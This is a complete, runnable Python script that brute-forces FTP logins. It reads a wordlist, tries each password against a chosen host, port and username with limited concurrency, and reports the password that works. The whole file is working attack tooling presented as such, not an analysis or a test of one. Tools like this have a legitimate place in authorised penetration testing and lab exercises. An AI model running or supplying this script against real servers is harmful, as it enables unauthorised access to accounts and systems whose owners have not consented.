import asyncio
import aioftp
import argparse
from termcolor import colored
from datetime import datetime
from os import path
from sys import exit

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Host to attack on e.g. 10.10.10.10.')
    parser.add_argument('-p', '--port', dest='port', default=21, type=int, required=False, help="Port to attack on, Default: 21")
    parser.add_argument('-w', '--wordlist', dest='wordlist', required=True, type=str)
    parser.add_argument('-u', '--username', dest='username', required=True, help="Username with which to bruteforce")
    arguments = parser.parse_args()
    return arguments

async def ftp_bruteforce(hostname, username, password, port, found_flag):
    try:
        async with aioftp.Client.context(hostname, user=username, password=password, port=port) as client:
            found_flag.set()
            print(colored(f"[{port}] [ftp] host: {hostname} login: {username} password: {password}", 'green'))
    except Exception as err:
        print(f"[Attempt] target {hostname} - login: {username} - password: {password}")

async def main(hostname, port, username, wordlist):
    tasks = []
    passwords = []
    found_flag = asyncio.Event()
    concurrency_limit = 10
    counter = 0
    
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            passwords.append(password)
    
    for password in passwords:
        if counter >= concurrency_limit:
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            tasks = []
            counter = 0
        
        if not found_flag.is_set():
            tasks.append(asyncio.create_task(ftp_bruteforce(hostname, username, password, port, found_flag)))
            await asyncio.sleep(1)
            counter += 1
    
    await asyncio.gather(*tasks)
    
    if not found_flag.is_set():
        print(colored("\n[-] Failed to find the correct password.", "red"))

if __name__ == "__main__":
    arguments = get_args()
    
    if not path.exists(arguments.wordlist):
        print(colored("[-] Wordlist location is not right,\n[-] Provide the right path of the wordlist", 'red'))
        exit(1)
    
    print("\n---------------------------------------------------------")
    print("---------------------------------------------------------")
    print(colored(f"[*] Target\t: ", "light_red"), end="")
    print(arguments.target)
    print(colored(f"[*] Username\t: ", "light_red"), end="")
    print(arguments.username)
    print(colored(f"[*] Port\t: ", "light_red"), end="")
    print(arguments.port)
    print(colored(f"[*] Wordlist\t: ", "light_red"), end="")
    print(arguments.wordlist)
    print(colored(f"[*] Protocol\t: ", "light_red"), end="")
    print("FTP")
    print("---------------------------------------------------------")
    print("---------------------------------------------------------")
    print(colored(f"FTP-Bruteforcer starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", "light_red"))
    print("---------------------------------------------------------")
    print("---------------------------------------------------------")
    
    asyncio.run(main(arguments.target, arguments.port, arguments.username, arguments.wordlist))
